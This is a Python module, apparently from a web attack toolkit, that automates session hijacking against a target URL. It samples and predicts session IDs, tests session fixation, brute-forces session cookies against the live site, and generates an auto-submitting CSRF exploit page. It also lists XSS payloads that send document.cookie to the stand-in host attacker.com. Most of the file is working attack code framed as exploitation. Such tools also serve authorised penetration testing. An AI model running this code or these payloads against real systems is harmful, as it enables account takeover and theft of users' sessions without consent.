"""
Session Hijacking Exploit Module
Automated exploitation of session management vulnerabilities
"""

import requests
import time
import hashlib
import random
import string
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urlparse, parse_qs


class SessionHijackExploit:
    """
    Automated session hijacking and session management exploitation
    """

    def __init__(self, target_url: str, timeout: int = 10, delay: float = 0.3):
        """
        Initialize session hijacking exploit

        Args:
            target_url: Target application URL
            timeout: Request timeout
            delay: Delay between requests
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.captured_sessions = []
        self.predicted_sessions = []

    def test_session_prediction(self, sample_size: int = 10) -> Dict[str, Any]:
        """
        Test if session IDs are predictable

        Args:
            sample_size: Number of sessions to sample

        Returns:
            Prediction test results
        """
        print(
            f"[*] Testing session ID predictability (sampling {sample_size} sessions)..."
        )

        results = {
            "vulnerable": False,
            "prediction_method": None,
            "predicted_sessions": [],
            "pattern_detected": False,
        }

        # Collect session ID samples
        session_samples = []
        for i in range(sample_size):
            session_id = self._get_new_session_id()
            if session_id:
                session_samples.append(session_id)
                print(f"[*] Sample {i+1}: {session_id}")
            time.sleep(self.delay)

        if len(session_samples) < 3:
            print("[!] Not enough session samples collected")
            return results

        # Analyze patterns

        # Test 1: Sequential/Numeric sessions
        if all(s.isdigit() for s in session_samples):
            print(
                "[+] Session IDs are purely numeric - testing for sequential pattern..."
            )
            numeric_sessions = [int(s) for s in session_samples]

            # Check if sequential
            if self._is_sequential(numeric_sessions):
                print("[+] VULNERABLE: Session IDs are sequential!")
                results["vulnerable"] = True
                results["prediction_method"] = "sequential_numeric"
                results["pattern_detected"] = True

                # Predict next sessions
                last_session = numeric_sessions[-1]
                for i in range(1, 11):
                    predicted = str(last_session + i)
                    results["predicted_sessions"].append(predicted)
                    print(f"[+] Predicted session: {predicted}")

        # Test 2: Timestamp-based sessions
        timestamp_pattern = self._check_timestamp_pattern(session_samples)
        if timestamp_pattern:
            print("[+] VULNERABLE: Session IDs appear to be timestamp-based!")
            results["vulnerable"] = True
            results["prediction_method"] = "timestamp_based"
            results["pattern_detected"] = True

            # Generate timestamp-based predictions
            current_time = int(time.time())
            for offset in range(-5, 6):
                predicted = str(current_time + offset)
                results["predicted_sessions"].append(predicted)

        # Test 3: Low entropy (short sessions)
        if all(len(s) < 8 for s in session_samples):
            print("[+] VULNERABLE: Session IDs have low entropy (< 8 characters)!")
            results["vulnerable"] = True
            results["prediction_method"] = "low_entropy_bruteforce"
            results["pattern_detected"] = True

        # Test 4: MD5/Hash-based with predictable input
        if all(len(s) == 32 for s in session_samples):
            print(
                "[*] Session IDs appear to be MD5 hashes - testing for predictable input..."
            )
            # Try common MD5 patterns
            for sample in session_samples[:3]:
                if self._test_md5_predictability(sample):
                    print("[+] VULNERABLE: Session MD5 hash uses predictable input!")
                    results["vulnerable"] = True
                    results["prediction_method"] = "md5_predictable_input"
                    results["pattern_detected"] = True
                    break

        self.predicted_sessions = results["predicted_sessions"]
        return results

    def test_session_fixation(self, session_param: str = "PHPSESSID") -> Dict[str, Any]:
        """
        Test session fixation vulnerability

        Args:
            session_param: Session parameter name

        Returns:
            Fixation test results
        """
        print(f"[*] Testing session fixation on parameter: {session_param}")

        results = {"vulnerable": False, "fixed_session_id": None, "accepted": False}

        # Generate custom session ID
        fixed_session = self._generate_custom_session_id()
        print(f"[*] Attempting to fix session to: {fixed_session}")

        # Step 1: Set custom session ID
        cookies = {session_param: fixed_session}

        try:
            response1 = self.session.get(
                self.target_url, cookies=cookies, timeout=self.timeout, verify=False
            )

            # Check if server accepted our session
            if session_param in response1.cookies:
                returned_session = response1.cookies.get(session_param)

                if returned_session == fixed_session:
                    print("[+] VULNERABLE: Server accepted custom session ID!")
                    results["vulnerable"] = True
                    results["fixed_session_id"] = fixed_session
                    results["accepted"] = True

                    # Step 2: Test if session persists after "authentication"
                    # (In real scenario, victim would authenticate with this session)
                    print("[*] Testing session persistence...")

                    time.sleep(1)

                    # Make another request with same session
                    response2 = self.session.get(
                        self.target_url,
                        cookies={session_param: fixed_session},
                        timeout=self.timeout,
                        verify=False,
                    )

                    if (
                        session_param in response2.cookies
                        and response2.cookies.get(session_param) == fixed_session
                    ):
                        print("[+] Session persists - fixation attack fully possible!")
                        results["persistent"] = True
                else:
                    print("[-] Server regenerated session ID (good security)")
            else:
                print("[-] No session cookie returned")

        except Exception as e:
            print(f"[!] Session fixation test error: {str(e)}")

        return results

    def test_session_hijacking_xss(self, xss_payload_url: str) -> Dict[str, Any]:
        """
        Test session hijacking via XSS (cookie theft)

        Args:
            xss_payload_url: URL with XSS payload that steals cookies

        Returns:
            XSS session hijack results
        """
        print("[*] Testing XSS-based session hijacking...")

        results = {
            "vulnerable": False,
            "stolen_cookies": [],
            "method": "xss_cookie_theft",
        }

        # Simulate XSS payload that would steal cookies
        cookie_stealer_payloads = [
            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
            "<img src=x onerror='fetch(\"http://attacker.com?c=\"+document.cookie)'>",
            "<svg onload='new Image().src=\"http://attacker.com?c=\"+document.cookie'>",
            "<iframe src='javascript:fetch(\"http://attacker.com?c=\"+document.cookie)'></iframe>",
        ]

        # Check if cookies have HttpOnly flag
        try:
            response = self.session.get(
                self.target_url, timeout=self.timeout, verify=False
            )

            cookies_info = []
            for cookie_name, cookie_value in response.cookies.items():
                # Check cookie attributes from Set-Cookie header
                set_cookie = response.headers.get("Set-Cookie", "")
                has_httponly = "HttpOnly" in set_cookie
                has_secure = "Secure" in set_cookie

                cookie_info = {
                    "name": cookie_name,
                    "value": (
                        cookie_value[:20] + "..."
                        if len(cookie_value) > 20
                        else cookie_value
                    ),
                    "has_httponly": has_httponly,
                    "has_secure": has_secure,
                    "stealable_via_xss": not has_httponly,
                }

                cookies_info.append(cookie_info)

                if not has_httponly:
                    print(
                        f"[+] VULNERABLE: Cookie '{cookie_name}' lacks HttpOnly flag!"
                    )
                    print(
                        f"    Can be stolen via XSS using: {cookie_stealer_payloads[0]}"
                    )
                    results["vulnerable"] = True
                    results["stolen_cookies"].append(cookie_info)

        except Exception as e:
            print(f"[!] Cookie analysis error: {str(e)}")

        return results

    def test_csrf_session_riding(
        self, action_url: str, csrf_token_name: Optional[str] = None
    ) -> Dict[str, Any]:
        """
        Test CSRF (Cross-Site Request Forgery) for session riding

        Args:
            action_url: URL of action to perform
            csrf_token_name: CSRF token parameter name if exists

        Returns:
            CSRF test results
        """
        print(f"[*] Testing CSRF protection on: {action_url}")

        results = {
            "vulnerable": False,
            "csrf_token_present": False,
            "csrf_token_name": csrf_token_name,
            "method": "csrf_session_riding",
        }

        try:
            # Make request without CSRF token or with invalid token
            test_data = {"action": "test", "value": "csrf_test"}

            if csrf_token_name:
                test_data[csrf_token_name] = "invalid_token_12345"

            response = self.session.post(
                action_url, data=test_data, timeout=self.timeout, verify=False
            )

            # Check if action was performed without valid CSRF token
            if response.status_code == 200 and "error" not in response.text.lower():
                print("[+] VULNERABLE: No CSRF protection detected!")
                results["vulnerable"] = True

                # Generate CSRF exploit HTML
                csrf_exploit = self._generate_csrf_exploit(action_url, test_data)
                results["csrf_exploit_html"] = csrf_exploit
                print("[+] CSRF exploit HTML generated")
            else:
                print("[-] CSRF protection appears to be in place")
                results["csrf_token_present"] = True

        except Exception as e:
            print(f"[!] CSRF test error: {str(e)}")

        return results

    def brute_force_session_ids(
        self, session_param: str = "PHPSESSID", max_attempts: int = 100
    ) -> Dict[str, Any]:
        """
        Brute force session IDs (for low-entropy sessions)

        Args:
            session_param: Session parameter name
            max_attempts: Maximum brute force attempts

        Returns:
            Brute force results
        """
        print(f"[*] Brute forcing session IDs (max {max_attempts} attempts)...")

        results = {"valid_sessions_found": [], "attempts": 0, "method": "brute_force"}

        # Generate session ID candidates based on detected patterns
        candidates = []

        # If we have predicted sessions, use those first
        if self.predicted_sessions:
            candidates.extend(self.predicted_sessions[:max_attempts])
        else:
            # Generate random candidates
            for i in range(max_attempts):
                # Try different formats
                if i % 3 == 0:
                    # Numeric
                    candidates.append(str(random.randint(1000000, 9999999)))
                elif i % 3 == 1:
                    # Short alphanumeric
                    candidates.append(
                        "".join(
                            random.choices(string.ascii_lowercase + string.digits, k=8)
                        )
                    )
                else:
                    # Longer alphanumeric
                    candidates.append(
                        "".join(
                            random.choices(string.ascii_letters + string.digits, k=16)
                        )
                    )

        print(f"[*] Testing {len(candidates)} session ID candidates...")

        for i, session_id in enumerate(candidates):
            if self._test_session_validity(session_param, session_id):
                print(f"[+] Valid session found: {session_id}")
                results["valid_sessions_found"].append(session_id)

            results["attempts"] += 1

            if (i + 1) % 20 == 0:
                print(f"[*] Progress: {i + 1}/{len(candidates)} attempts")

            time.sleep(self.delay)

        if results["valid_sessions_found"]:
            print(f"[+] Found {len(results['valid_sessions_found'])} valid sessions!")
        else:
            print("[-] No valid sessions found via brute force")

        return results

    def capture_session_via_mitm(
        self, proxy_host: str = "localhost", proxy_port: int = 8080
    ) -> Dict[str, Any]:
        """
        Simulate session capture via Man-in-the-Middle attack

        Args:
            proxy_host: Proxy host for MITM
            proxy_port: Proxy port

        Returns:
            MITM capture results
        """
        print(
            f"[*] Testing session capture via MITM (proxy: {proxy_host}:{proxy_port})..."
        )

        results = {
            "https_enforced": False,
            "hsts_enabled": False,
            "vulnerable_to_mitm": False,
            "method": "mitm_capture",
        }

        # Check if HTTPS is enforced
        parsed = urlparse(self.target_url)
        if parsed.scheme == "https":
            results["https_enforced"] = True
            print("[+] HTTPS is used")

            # Check for HSTS header
            try:
                response = self.session.get(
                    self.target_url, timeout=self.timeout, verify=False
                )
                if "Strict-Transport-Security" in response.headers:
                    results["hsts_enabled"] = True
                    print("[+] HSTS header present (good)")
                else:
                    print("[!] HSTS header missing - vulnerable to SSL stripping")
                    results["vulnerable_to_mitm"] = True
            except:
                pass
        else:
            print("[!] VULNERABLE: Application uses HTTP (no encryption)")
            results["vulnerable_to_mitm"] = True
            print("[!] Session cookies can be captured in plaintext via MITM")

        return results

    def _get_new_session_id(self, session_param: str = "PHPSESSID") -> Optional[str]:
        """Get a new session ID from the server"""
        try:
            # Create new session to get fresh session ID
            new_session = requests.Session()
            response = new_session.get(
                self.target_url, timeout=self.timeout, verify=False
            )

            if session_param in response.cookies:
                return response.cookies.get(session_param)

            # Try to find session in Set-Cookie header
            set_cookie = response.headers.get("Set-Cookie", "")
            if session_param in set_cookie:
                # Extract session ID from Set-Cookie header
                parts = set_cookie.split(";")
                for part in parts:
                    if session_param in part:
                        return part.split("=")[1].strip()
        except:
            pass

        return None

    def _is_sequential(self, numbers: List[int]) -> bool:
        """Check if numbers are sequential"""
        if len(numbers) < 2:
            return False

        differences = [numbers[i + 1] - numbers[i] for i in range(len(numbers) - 1)]

        # Check if all differences are the same (sequential)
        return len(set(differences)) == 1 and differences[0] != 0

    def _check_timestamp_pattern(self, sessions: List[str]) -> bool:
        """Check if sessions follow timestamp pattern"""
        try:
            # Try to parse as timestamps
            timestamps = []
            for s in sessions:
                # Try different timestamp formats
                if s.isdigit() and len(s) == 10:  # Unix timestamp
                    timestamps.append(int(s))
                elif s.isdigit() and len(s) == 13:  # Millisecond timestamp
                    timestamps.append(int(s) / 1000)

            if len(timestamps) >= 2:
                # Check if timestamps are close to current time
                current_time = int(time.time())
                return all(
                    abs(ts - current_time) < 86400 for ts in timestamps
                )  # Within 24 hours
        except:
            pass

        return False

    def _test_md5_predictability(self, md5_hash: str) -> bool:
        """Test if MD5 hash uses predictable input"""
        # Try common MD5 patterns
        predictable_inputs = [
            str(int(time.time())),  # Current timestamp
            str(int(time.time()) - 1),  # Previous second
            "1",
            "2",
            "3",
            "12345",  # Simple numbers
            "admin",
            "user",
            "session",  # Common strings
        ]

        for input_str in predictable_inputs:
            if hashlib.md5(input_str.encode()).hexdigest() == md5_hash:
                print(f"[+] MD5 hash matches predictable input: {input_str}")
                return True

        return False

    def _generate_custom_session_id(self) -> str:
        """Generate custom session ID for fixation attack"""
        return "FIXED_SESSION_" + "".join(
            random.choices(string.ascii_letters + string.digits, k=20)
        )

    def _test_session_validity(self, session_param: str, session_id: str) -> bool:
        """Test if a session ID is valid"""
        try:
            cookies = {session_param: session_id}
            response = self.session.get(
                self.target_url, cookies=cookies, timeout=self.timeout, verify=False
            )

            # Check for authenticated indicators
            authenticated_indicators = [
                "dashboard" in response.text.lower(),
                "logout" in response.text.lower(),
                "welcome" in response.text.lower(),
                "profile" in response.text.lower(),
            ]

            return any(authenticated_indicators)
        except:
            return False

    def _generate_csrf_exploit(self, action_url: str, form_data: Dict[str, str]) -> str:
        """Generate CSRF exploit HTML"""
        form_fields = "\n".join(
            [
                f'<input type="hidden" name="{key}" value="{value}" />'
                for key, value in form_data.items()
            ]
        )

        html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>CSRF Exploit PoC</h1>
    <p>This page will automatically submit a request to {action_url}</p>
    
    <form id="csrfForm" action="{action_url}" method="POST">
        {form_fields}
    </form>
    
    <script>
        // Auto-submit form when page loads
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
        """

        return html.strip()

    def execute_full_exploitation(
        self, session_param: str = "PHPSESSID"
    ) -> Dict[str, Any]:
        """
        Execute full session hijacking exploitation

        Args:
            session_param: Session parameter name

        Returns:
            Complete exploitation results
        """
        print("=" * 60)
        print("SESSION HIJACKING EXPLOITATION")
        print("=" * 60)

        results = {
            "success": False,
            "vulnerabilities_found": [],
            "exploitation_methods": [],
        }

        # Test 1: Session Prediction
        prediction_result = self.test_session_prediction(sample_size=5)
        if prediction_result["vulnerable"]:
            results["success"] = True
            results["vulnerabilities_found"].append("session_prediction")
            results["exploitation_methods"].append(
                {"method": "prediction", "details": prediction_result}
            )

        # Test 2: Session Fixation
        fixation_result = self.test_session_fixation(session_param)
        if fixation_result["vulnerable"]:
            results["success"] = True
            results["vulnerabilities_found"].append("session_fixation")
            results["exploitation_methods"].append(
                {"method": "fixation", "details": fixation_result}
            )

        # Test 3: XSS Cookie Theft
        xss_result = self.test_session_hijacking_xss("")
        if xss_result["vulnerable"]:
            results["success"] = True
            results["vulnerabilities_found"].append("xss_cookie_theft")
            results["exploitation_methods"].append(
                {"method": "xss", "details": xss_result}
            )

        # Test 4: MITM Vulnerability
        mitm_result = self.capture_session_via_mitm()
        if mitm_result["vulnerable_to_mitm"]:
            results["success"] = True
            results["vulnerabilities_found"].append("mitm_vulnerable")
            results["exploitation_methods"].append(
                {"method": "mitm", "details": mitm_result}
            )

        print("=" * 60)
        print("EXPLOITATION COMPLETE")
        print(f"Success: {results['success']}")
        print(f"Vulnerabilities Found: {len(results['vulnerabilities_found'])}")
        print(f"Methods: {', '.join(results['vulnerabilities_found'])}")
        print("=" * 60)

        return results

    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get summary of exploitation results"""
        return {
            "captured_sessions": len(self.captured_sessions),
            "predicted_sessions": len(self.predicted_sessions),
            "sessions": self.captured_sessions,
        }
